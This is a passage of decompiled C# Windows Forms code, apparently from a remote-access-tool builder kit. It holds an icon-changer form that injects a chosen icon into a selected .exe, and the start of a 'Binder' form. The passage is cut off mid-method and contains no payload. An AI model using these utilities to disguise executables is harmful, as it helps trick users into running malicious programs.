				{
					this._Button7.Click -= value2;
				}
				this._Button7 = value;
				flag = (this._Button7 != null);
				if (flag)
				{
					this._Button7.Click += value2;
				}
			}
		}

		internal virtual ProgressBar ProgressBar1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ProgressBar1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ProgressBar1 = value;
			}
		}

		internal virtual OpenFileDialog OpenFileDialog1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._OpenFileDialog1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._OpenFileDialog1 = value;
			}
		}

		internal virtual PictureBox PictureBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PictureBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._PictureBox1 = value;
			}
		}

		internal virtual Button Button6
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button6;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Button6 = value;
			}
		}

		internal virtual Button Button8
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button8;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Button8 = value;
			}
		}

		internal virtual Button Button2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Button2 = value;
			}
		}

		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button1_Click);
				bool flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click -= value2;
				}
				this._Button1 = value;
				flag = (this._Button1 != null);
				if (flag)
				{
					this._Button1.Click += value2;
				}
			}
		}

		internal virtual Button Button10
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button10;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Button10 = value;
			}
		}

		[DebuggerNonUserCode]
		public Form5()
		{
			base.Load += new EventHandler(this.Form5_Load);
			Form5.__ENCAddToList(this);
			this.InitializeComponent();
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = Form5.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = Form5.__ENCList.Count == Form5.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = Form5.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = Form5.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									Form5.__ENCList[num] = Form5.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						Form5.__ENCList.RemoveRange(num, Form5.__ENCList.Count - num);
						Form5.__ENCList.Capacity = Form5.__ENCList.Count;
					}
					Form5.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		[DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				bool flag = disposing && this.components != null;
				if (flag)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		[DebuggerStepThrough]
		private void InitializeComponent()
		{
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form5));
			this.OpenFileDialog1 = new OpenFileDialog();
			this.NyX_GroupBox1 = new NYX_GroupBox();
			this.Button2 = new Button();
			this.Button1 = new Button();
			this.Button10 = new Button();
			this.Button8 = new Button();
			this.Button6 = new Button();
			this.PictureBox1 = new PictureBox();
			this.ProgressBar1 = new ProgressBar();
			this.Button7 = new Button();
			this.Button5 = new Button();
			this.Button4 = new Button();
			this.LogInRichTextBox1 = new LogInRichTextBox();
			this.LogInRichTextBox2 = new LogInRichTextBox();
			this.NyX_GroupBox1.SuspendLayout();
			((ISupportInitialize)this.PictureBox1).BeginInit();
			this.SuspendLayout();
			this.OpenFileDialog1.FileName = "OpenFileDialog1";
			this.NyX_GroupBox1.Animated = true;
			this.NyX_GroupBox1.BorderStyle = FormBorderStyle.None;
			this.NyX_GroupBox1.Colors = new Bloom[0];
			this.NyX_GroupBox1.Controls.Add(this.Button2);
			this.NyX_GroupBox1.Controls.Add(this.Button1);
			this.NyX_GroupBox1.Controls.Add(this.Button10);
			this.NyX_GroupBox1.Controls.Add(this.Button8);
			this.NyX_GroupBox1.Controls.Add(this.Button6);
			this.NyX_GroupBox1.Controls.Add(this.PictureBox1);
			this.NyX_GroupBox1.Controls.Add(this.ProgressBar1);
			this.NyX_GroupBox1.Controls.Add(this.Button7);
			this.NyX_GroupBox1.Controls.Add(this.Button5);
			this.NyX_GroupBox1.Controls.Add(this.Button4);
			this.NyX_GroupBox1.Controls.Add(this.LogInRichTextBox1);
			this.NyX_GroupBox1.Controls.Add(this.LogInRichTextBox2);
			this.NyX_GroupBox1.Customization = "";
			this.NyX_GroupBox1.Font = new Font("Arial", 9f);
			this.NyX_GroupBox1.Image = null;
			Control arg_275_0 = this.NyX_GroupBox1;
			Point location = new Point(-25, -32);
			arg_275_0.Location = location;
			this.NyX_GroupBox1.Movable = true;
			this.NyX_GroupBox1.Name = "NyX_GroupBox1";
			this.NyX_GroupBox1.NoRounding = false;
			this.NyX_GroupBox1.Sizable = true;
			Control arg_2CD_0 = this.NyX_GroupBox1;
			Size size = new Size(375, 149);
			arg_2CD_0.Size = size;
			this.NyX_GroupBox1.SmartBounds = true;
			this.NyX_GroupBox1.StartPosition = FormStartPosition.Manual;
			this.NyX_GroupBox1.TabIndex = 3;
			this.NyX_GroupBox1.Text = "*";
			this.NyX_GroupBox1.TransparencyKey = Color.Empty;
			this.NyX_GroupBox1.Transparent = false;
			this.Button2.BackColor = Color.FromArgb(54, 54, 54);
			this.Button2.FlatStyle = FlatStyle.Flat;
			this.Button2.ForeColor = Color.Black;
			this.Button2.Image = (Image)componentResourceManager.GetObject("Button2.Image");
			Control arg_390_0 = this.Button2;
			location = new Point(250, 112);
			arg_390_0.Location = location;
			this.Button2.Name = "Button2";
			Control arg_3BB_0 = this.Button2;
			size = new Size(29, 22);
			arg_3BB_0.Size = size;
			this.Button2.TabIndex = 125;
			this.Button2.Text = ".";
			this.Button2.UseVisualStyleBackColor = false;
			this.Button1.BackColor = Color.FromArgb(54, 54, 54);
			this.Button1.FlatStyle = FlatStyle.Flat;
			this.Button1.Font = new Font("Segoe UI", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.Button1.ForeColor = Color.Black;
			Control arg_456_0 = this.Button1;
			location = new Point(275, 112);
			arg_456_0.Location = location;
			this.Button1.Name = "Button1";
			Control arg_481_0 = this.Button1;
			size = new Size(94, 23);
			arg_481_0.Size = size;
			this.Button1.TabIndex = 124;
			this.Button1.Text = "Ico Extractor";
			this.Button1.UseVisualStyleBackColor = false;
			this.Button10.BackColor = Color.FromArgb(54, 54, 54);
			this.Button10.FlatStyle = FlatStyle.Flat;
			this.Button10.ForeColor = Color.Black;
			this.Button10.Image = (Image)componentResourceManager.GetObject("Button10.Image");
			Control arg_51A_0 = this.Button10;
			location = new Point(250, 73);
			arg_51A_0.Location = location;
			this.Button10.Name = "Button10";
			Control arg_545_0 = this.Button10;
			size = new Size(29, 23);
			arg_545_0.Size = size;
			this.Button10.TabIndex = 123;
			this.Button10.Text = ".";
			this.Button10.UseVisualStyleBackColor = false;
			this.Button8.BackColor = Color.FromArgb(54, 54, 54);
			this.Button8.FlatStyle = FlatStyle.Flat;
			this.Button8.ForeColor = Color.Black;
			this.Button8.Image = (Image)componentResourceManager.GetObject("Button8.Image");
			Control arg_5DE_0 = this.Button8;
			location = new Point(250, 92);
			arg_5DE_0.Location = location;
			this.Button8.Name = "Button8";
			Control arg_609_0 = this.Button8;
			size = new Size(29, 23);
			arg_609_0.Size = size;
			this.Button8.TabIndex = 122;
			this.Button8.Text = ".";
			this.Button8.UseVisualStyleBackColor = false;
			this.Button6.BackColor = Color.FromArgb(54, 54, 54);
			this.Button6.FlatStyle = FlatStyle.Flat;
			this.Button6.ForeColor = Color.Black;
			this.Button6.Image = (Image)componentResourceManager.GetObject("Button6.Image");
			Control arg_6A2_0 = this.Button6;
			location = new Point(250, 44);
			arg_6A2_0.Location = location;
			this.Button6.Name = "Button6";
			Control arg_6CD_0 = this.Button6;
			size = new Size(29, 23);
			arg_6CD_0.Size = size;
			this.Button6.TabIndex = 77;
			this.Button6.Text = ".";
			this.Button6.UseVisualStyleBackColor = false;
			this.PictureBox1.BackColor = Color.Black;
			Control arg_729_0 = this.PictureBox1;
			location = new Point(363, 187);
			arg_729_0.Location = location;
			this.PictureBox1.Name = "PictureBox1";
			Control arg_754_0 = this.PictureBox1;
			size = new Size(38, 17);
			arg_754_0.Size = size;
			this.PictureBox1.TabIndex = 121;
			this.PictureBox1.TabStop = false;
			this.ProgressBar1.Dock = DockStyle.Bottom;
			Control arg_797_0 = this.ProgressBar1;
			location = new Point(0, 139);
			arg_797_0.Location = location;
			this.ProgressBar1.Name = "ProgressBar1";
			Control arg_7C5_0 = this.ProgressBar1;
			size = new Size(375, 10);
			arg_7C5_0.Size = size;
			this.ProgressBar1.TabIndex = 120;
			this.Button7.BackColor = Color.FromArgb(54, 54, 54);
			this.Button7.FlatStyle = FlatStyle.Flat;
			this.Button7.Font = new Font("Segoe UI", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.Button7.ForeColor = Color.Black;
			Control arg_842_0 = this.Button7;
			location = new Point(275, 92);
			arg_842_0.Location = location;
			this.Button7.Name = "Button7";
			Control arg_86D_0 = this.Button7;
			size = new Size(94, 23);
			arg_86D_0.Size = size;
			this.Button7.TabIndex = 119;
			this.Button7.Text = "Change";
			this.Button7.UseVisualStyleBackColor = false;
			this.Button5.BackColor = Color.FromArgb(54, 54, 54);
			this.Button5.FlatStyle = FlatStyle.Flat;
			this.Button5.Font = new Font("Segoe UI", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.Button5.ForeColor = Color.Black;
			Control arg_908_0 = this.Button5;
			location = new Point(275, 73);
			arg_908_0.Location = location;
			this.Button5.Name = "Button5";
			Control arg_933_0 = this.Button5;
			size = new Size(94, 23);
			arg_933_0.Size = size;
			this.Button5.TabIndex = 118;
			this.Button5.Text = "Select Ico";
			this.Button5.UseVisualStyleBackColor = false;
			this.Button4.BackColor = Color.FromArgb(54, 54, 54);
			this.Button4.FlatStyle = FlatStyle.Flat;
			this.Button4.Font = new Font("Segoe UI", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.Button4.ForeColor = Color.Black;
			Control arg_9CE_0 = this.Button4;
			location = new Point(275, 44);
			arg_9CE_0.Location = location;
			this.Button4.Name = "Button4";
			Control arg_9F9_0 = this.Button4;
			size = new Size(94, 23);
			arg_9F9_0.Size = size;
			this.Button4.TabIndex = 117;
			this.Button4.Text = "Select Exe";
			this.Button4.UseVisualStyleBackColor = false;
			this.LogInRichTextBox1.BackColor = Color.FromArgb(54, 54, 54);
			this.LogInRichTextBox1.BaseColour = Color.FromArgb(42, 42, 42);
			this.LogInRichTextBox1.BorderColour = Color.FromArgb(35, 35, 35);
			this.LogInRichTextBox1.ForeColor = Color.LightSteelBlue;
			Control arg_A94_0 = this.LogInRichTextBox1;
			location = new Point(37, 44);
			arg_A94_0.Location = location;
			this.LogInRichTextBox1.Name = "LogInRichTextBox1";
			Control arg_AC2_0 = this.LogInRichTextBox1;
			size = new Size(207, 42);
			arg_AC2_0.Size = size;
			this.LogInRichTextBox1.TabIndex = 116;
			this.LogInRichTextBox1.TextColour = Color.FromArgb(255, 255, 255);
			this.LogInRichTextBox2.BackColor = Color.FromArgb(54, 54, 54);
			this.LogInRichTextBox2.BaseColour = Color.FromArgb(42, 42, 42);
			this.LogInRichTextBox2.BorderColour = Color.FromArgb(35, 35, 35);
			this.LogInRichTextBox2.ForeColor = Color.LightSteelBlue;
			Control arg_B5F_0 = this.LogInRichTextBox2;
			location = new Point(37, 83);
			arg_B5F_0.Location = location;
			this.LogInRichTextBox2.Name = "LogInRichTextBox2";
			Control arg_B8D_0 = this.LogInRichTextBox2;
			size = new Size(207, 52);
			arg_B8D_0.Size = size;
			this.LogInRichTextBox2.TabIndex = 115;
			this.LogInRichTextBox2.TextColour = Color.FromArgb(255, 255, 255);
			SizeF autoScaleDimensions = new SizeF(6f, 13f);
			this.AutoScaleDimensions = autoScaleDimensions;
			this.AutoScaleMode = AutoScaleMode.Font;
			this.BackColor = Color.Black;
			size = new Size(350, 109);
			this.ClientSize = size;
			this.Controls.Add(this.NyX_GroupBox1);
			this.FormBorderStyle = FormBorderStyle.SizableToolWindow;
			this.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			this.Name = "Form5";
			this.Text = "Change";
			this.NyX_GroupBox1.ResumeLayout(false);
			((ISupportInitialize)this.PictureBox1).EndInit();
			this.ResumeLayout(false);
		}

		private void Button4_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = this.OpenFileDialog1;
			openFileDialog.FileName = "";
			openFileDialog.Filter = "Executable (*.exe)|*.exe";
			openFileDialog.Title = "Browse...";
			openFileDialog.ShowDialog();
			this.LogInRichTextBox1.Text = openFileDialog.FileName;
		}

		private void Form5_Load(object sender, EventArgs e)
		{
			this.Text = "Change: " + Environment.MachineName + "\\@" + Environment.UserName;
			try
			{
				string empty = string.Empty;
				string[] array = Strings.Split(empty, "\r\n", -1, CompareMethod.Binary);
			}
			catch (Exception expr_38)
			{
				ProjectData.SetProjectError(expr_38);
				ProjectData.ClearProjectError();
			}
			checked
			{
				this.Top = Screen.PrimaryScreen.WorkingArea.Height - this.Width - 90;
				this.Left = Screen.PrimaryScreen.WorkingArea.Width - this.Width - 350;
			}
		}

		private void Button5_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = this.OpenFileDialog1;
			openFileDialog.FileName = "Icon";
			openFileDialog.Filter = "Icon (*.ico)|*.ico";
			openFileDialog.Title = "Browse...";
			openFileDialog.ShowDialog();
			this.LogInRichTextBox2.Text = openFileDialog.FileName;
			Icon icon = new Icon(openFileDialog.FileName);
			Bitmap image = new Bitmap(icon.ToBitmap());
			this.PictureBox1.Image = image;
		}

		private void Button7_Click(object sender, EventArgs e)
		{
			this.fichier = this.LogInRichTextBox1.Text;
			this.ProgressBar1.Value = 20;
			this.icone = this.LogInRichTextBox2.Text;
			this.ProgressBar1.Value = 60;
			IconChanger.InjectIcon(this.fichier, this.icone);
			this.ProgressBar1.Value = 100;
			Interaction.MsgBox("Success Icon Change", MsgBoxStyle.Information, "Success");
		}

		private void Button1_Click(object sender, EventArgs e)
		{
			MyProject.Forms.Form7.Show();
			this.Hide();
		}
	}
}

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using nj.My;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	[DesignerGenerated]
	public class Form6 : Form
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private IContainer components;

		[AccessedThroughProperty("NsOnOffBox1")]
		private NSOnOffBox _NsOnOffBox1;

		[AccessedThroughProperty("LogInTabControl1")]
		private LogInTabControl _LogInTabControl1;

		[AccessedThroughProperty("TabPage2")]
		private TabPage _TabPage2;

		[AccessedThroughProperty("Button10")]
		private Button _Button10;

		[AccessedThroughProperty("Button8")]
		private Button _Button8;

		[AccessedThroughProperty("Button6")]
		private Button _Button6;

		[AccessedThroughProperty("Button3")]
		private Button _Button3;

		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		[AccessedThroughProperty("Button2")]
		private Button _Button2;

		[AccessedThroughProperty("LogInRichTextBox6")]
		private LogInRichTextBox _LogInRichTextBox6;

		[AccessedThroughProperty("LogInRichTextBox5")]
		private LogInRichTextBox _LogInRichTextBox5;

		[AccessedThroughProperty("PictureBox1")]
		private PictureBox _PictureBox1;

		[AccessedThroughProperty("CheckBox1")]
		private CheckBox _CheckBox1;

		[AccessedThroughProperty("OpenFileDialog1")]
		private OpenFileDialog _OpenFileDialog1;

		[AccessedThroughProperty("Button5")]
		private Button _Button5;

		[AccessedThroughProperty("Button9")]
		private Button _Button9;

		[AccessedThroughProperty("LogInRichTextBox1")]
		private LogInRichTextBox _LogInRichTextBox1;

		[AccessedThroughProperty("LogInRichTextBox2")]
		private LogInRichTextBox _LogInRichTextBox2;

		private string fichier;

		private string icone;

		internal virtual NSOnOffBox NsOnOffBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._NsOnOffBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._NsOnOffBox1 = value;
			}
		}

		internal virtual LogInTabControl LogInTabControl1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LogInTabControl1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._LogInTabControl1 = value;
			}
		}

		internal virtual TabPage TabPage2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TabPage2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TabPage2 = value;
			}
		}

		internal virtual Button Button10
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button10;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Button10 = value;
			}
		}

		internal virtual Button Button8
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button8;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Button8 = value;
			}
		}

		internal virtual Button Button6
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button6;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Button6 = value;
			}
		}

		internal virtual Button Button3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button3_Click);
				bool flag = this._Button3 != null;
				if (flag)
				{
					this._Button3.Click -= value2;
				}
				this._Button3 = value;
				flag = (this._Button3 != null);
				if (flag)
				{
					this._Button3.Click += value2;
				}
			}
		}

		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button1_Click_2);
				bool flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click -= value2;
				}
				this._Button1 = value;
				flag = (this._Button1 != null);
				if (flag)
				{
					this._Button1.Click += value2;
				}
			}
		}

		internal virtual Button Button2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button2_Click_2);
				bool flag = this._Button2 != null;
				if (flag)
				{
					this._Button2.Click -= value2;
				}
				this._Button2 = value;
				flag = (this._Button2 != null);
				if (flag)
				{
					this._Button2.Click += value2;
				}
			}
		}

		internal virtual LogInRichTextBox LogInRichTextBox6
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LogInRichTextBox6;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._LogInRichTextBox6 = value;
			}
		}

		internal virtual LogInRichTextBox LogInRichTextBox5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LogInRichTextBox5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._LogInRichTextBox5 = value;
			}
		}

		internal virtual PictureBox PictureBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PictureBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._PictureBox1 = value;
			}
		}

		internal virtual CheckBox CheckBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CheckBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._CheckBox1 = value;
			}
		}

		internal virtual OpenFileDialog OpenFileDialog1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._OpenFileDialog1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._OpenFileDialog1 = value;
			}
		}

		internal virtual Button Button5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button5_Click_1);
				bool flag = this._Button5 != null;
				if (flag)
				{
					this._Button5.Click -= value2;
				}
				this._Button5 = value;
				flag = (this._Button5 != null);
				if (flag)
				{
					this._Button5.Click += value2;
				}
			}
		}

		internal virtual Button Button9
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button9;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Button9 = value;
			}
		}

		internal virtual LogInRichTextBox LogInRichTextBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LogInRichTextBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._LogInRichTextBox1 = value;
			}
		}

		internal virtual LogInRichTextBox LogInRichTextBox2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._LogInRichTextBox2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._LogInRichTextBox2 = value;
			}
		}

		[DebuggerNonUserCode]
		public Form6()
		{
			base.Load += new EventHandler(this.Form6_Load);
			Form6.__ENCAddToList(this);
			this.InitializeComponent();
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = Form6.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = Form6.__ENCList.Count == Form6.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = Form6.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = Form6.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									Form6.__ENCList[num] = Form6.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						Form6.__ENCList.RemoveRange(num, Form6.__ENCList.Count - num);
						Form6.__ENCList.Capacity = Form6.__ENCList.Count;
					}
					Form6.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		[DebuggerNonUserCode]
		protected override void Dispose(bool disposing)
		{
			try
			{
				bool flag = disposing && this.components != null;
				if (flag)
				{
					this.components.Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		[DebuggerStepThrough]
		private void InitializeComponent()
		{
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form6));
			this.OpenFileDialog1 = new OpenFileDialog();
			this.Button9 = new Button();
			this.Button5 = new Button();
			this.LogInRichTextBox2 = new LogInRichTextBox();
			this.LogInRichTextBox1 = new LogInRichTextBox();
			this.LogInTabControl1 = new LogInTabControl();
			this.TabPage2 = new TabPage();
			this.CheckBox1 = new CheckBox();
			this.PictureBox1 = new PictureBox();
			this.Button10 = new Button();
			this.Button8 = new Button();
			this.Button6 = new Button();
			this.Button3 = new Button();
			this.Button1 = new Button();
			this.Button2 = new Button();
			this.LogInRichTextBox6 = new LogInRichTextBox();
			this.LogInRichTextBox5 = new LogInRichTextBox();
			this.NsOnOffBox1 = new NSOnOffBox();
			this.LogInTabControl1.SuspendLayout();
			this.TabPage2.SuspendLayout();
			((ISupportInitialize)this.PictureBox1).BeginInit();
			this.SuspendLayout();
			this.OpenFileDialog1.FileName = "OpenFileDialog1";
			this.Button9.BackColor = Color.FromArgb(54, 54, 54);
			this.Button9.FlatStyle = FlatStyle.Flat;
			this.Button9.ForeColor = Color.Black;
			this.Button9.Image = (Image)componentResourceManager.GetObject("Button9.Image");
			Control arg_18F_0 = this.Button9;
			Point location = new Point(302, 187);
			arg_18F_0.Location = location;
			this.Button9.Name = "Button9";
			Control arg_1BA_0 = this.Button9;
			Size size = new Size(29, 23);
			arg_1BA_0.Size = size;
			this.Button9.TabIndex = 114;
			this.Button9.Text = ".";
			this.Button9.UseVisualStyleBackColor = false;
			this.Button5.BackColor = Color.FromArgb(54, 54, 54);
			this.Button5.FlatStyle = FlatStyle.Flat;
			this.Button5.Font = new Font("Segoe UI", 9f, FontStyle.Regular, GraphicsUnit.Point, 0);
			this.Button5.ForeColor = Color.Black;
			Control arg_258_0 = this.Button5;
			location = new Point(401, 270);
			arg_258_0.Location = location;
			this.Button5.Name = "Button5";
			Control arg_283_0 = this.Button5;
			size = new Size(101, 23);
			arg_283_0.Size = size;
			this.Button5.TabIndex = 113;
			this.Button5.Text = "Select Ico";
			this.Button5.UseVisualStyleBackColor = false;
			this.LogInRichTextBox2.BaseColour = Color.FromArgb(42, 42, 42);
			this.LogInRichTextBox2.BorderColour = Color.FromArgb(35, 35, 35);
			Control arg_2FC_0 = this.LogInRichTextBox2;
			location = new Point(165, 280);
			arg_2FC_0.Location = location;
			this.LogInRichTextBox2.Name = "LogInRichTextBox2";
			Control arg_32A_0 = this.LogInRichTextBox2;
			size = new Size(207, 42);
			arg_32A_0.Size = size;
			this.LogInRichTextBox2.TabIndex = 77;
			this.LogInRichTextBox2.TextColour = Color.FromArgb(255, 255, 255);
			this.LogInRichTextBox1.BaseColour = Color.FromArgb(42, 42, 42);
			this.LogInRichTextBox1.BorderColour = Color.FromArgb(35, 35, 35);
			Control arg_3A5_0 = this.LogInRichTextBox1;
			location = new Point(165, 240);
			arg_3A5_0.Location = location;
			this.LogInRichTextBox1.Name = "LogInRichTextBox1";
			Control arg_3D3_0 = this.LogInRichTextBox1;
			size = new Size(207, 34);
			arg_3D3_0.Size = size;
			this.LogInRichTextBox1.TabIndex = 76;
			this.LogInRichTextBox1.TextColour = Color.FromArgb(255, 255, 255);
			this.LogInTabControl1.ActiveColour = Color.FromArgb(47, 47, 47);
			this.LogInTabControl1.BackTabColour = Color.FromArgb(42, 42, 42);
			this.LogInTabControl1.BaseColour = Color.FromArgb(35, 35, 35);
			this.LogInTabControl1.BorderColour = Color.FromArgb(30, 30, 30);
			this.LogInTabControl1.Controls.Add(this.TabPage2);
			this.LogInTabControl1.Font = new Font("Segoe UI", 10f);
			this.LogInTabControl1.HorizontalLineColour = Color.FromArgb(23, 119, 151);
			TabControl arg_4C6_0 = this.LogInTabControl1;
			size = new Size(240, 32);
			arg_4C6_0.ItemSize = size;
			Control arg_4DF_0 = this.LogInTabControl1;
			location = new Point(-6, -34);
			arg_4DF_0.Location = location;
			this.LogInTabControl1.Name = "LogInTabControl1";
			this.LogInTabControl1.SelectedIndex = 0;
			Control arg_51D_0 = this.LogInTabControl1;
			size = new Size(366, 139);
			arg_51D_0.Size = size;
			this.LogInTabControl1.TabIndex = 75;
			this.LogInTabControl1.TextColour = Color.FromArgb(255, 255, 255);
			this.LogInTabControl1.UpLineColour = Color.FromArgb(0, 160, 199);
			this.TabPage2.BackColor = Color.FromArgb(42, 42, 42);
			this.TabPage2.BorderStyle = BorderStyle.FixedSingle;
			this.TabPage2.Controls.Add(this.CheckBox1);
			this.TabPage2.Controls.Add(this.PictureBox1);
			this.TabPage2.Controls.Add(this.Button10);
			this.TabPage2.Controls.Add(this.Button8);
			this.TabPage2.Controls.Add(this.Button6);
			this.TabPage2.Controls.Add(this.Button3);
			this.TabPage2.Controls.Add(this.Button1);
			this.TabPage2.Controls.Add(this.Button2);
			this.TabPage2.Controls.Add(this.LogInRichTextBox6);
			this.TabPage2.Controls.Add(this.LogInRichTextBox5);
			this.TabPage2.ForeColor = Color.LightSteelBlue;
			TabPage arg_69A_0 = this.TabPage2;
			location = new Point(4, 36);
			arg_69A_0.Location = location;
			this.TabPage2.Name = "TabPage2";
			Control arg_6C2_0 = this.TabPage2;
			Padding padding = new Padding(3);
			arg_6C2_0.Padding = padding;
			Control arg_6DF_0 = this.TabPage2;
			size = new Size(358, 99);
			arg_6DF_0.Size = size;
			this.TabPage2.TabIndex = 1;
			this.TabPage2.Text = "Binder";
			this.CheckBox1.AutoSize = true;
			this.CheckBox1.BackColor = Color.Black;
			this.CheckBox1.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.CheckBox1.ForeColor = Color.LightSteelBlue;
			Control arg_766_0 = this.CheckBox1;
			location = new Point(402, 97);
			arg_766_0.Location = location;
			this.CheckBox1.Name = "CheckBox1";
			Control arg_791_0 = this.CheckBox1;
			size = new Size(48, 17);
			arg_791_0.Size = size;
			this.CheckBox1.TabIndex = 80;
			this.CheckBox1.Text = "Icon";
			this.CheckBox1.UseVisualStyleBackColor = false;
			Control arg_7D9_0 = this.PictureBox1;
			location = new Point(273, 125);
